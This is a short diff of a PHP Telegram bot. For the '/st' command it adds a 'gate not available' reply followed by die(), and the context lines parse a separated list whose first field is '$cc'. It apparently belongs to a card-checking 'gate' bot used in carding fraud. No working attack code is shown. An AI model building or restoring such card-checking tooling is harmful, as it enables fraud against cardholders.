@@ -204,6 +204,11 @@ ob_flush();
 
 	
 if (preg_match('/^(!|\/|\.)st/', $message)) {
+
+	$respuesta = "Gate no disponible por el momento!!";
+	sendMessage($chatId, $respuesta, $message_id);
+	die();
+	
 $lista = substr($message, 4);
 $i = preg_split('/[|:| ]/', $lista);
 $cc    = $i[0];
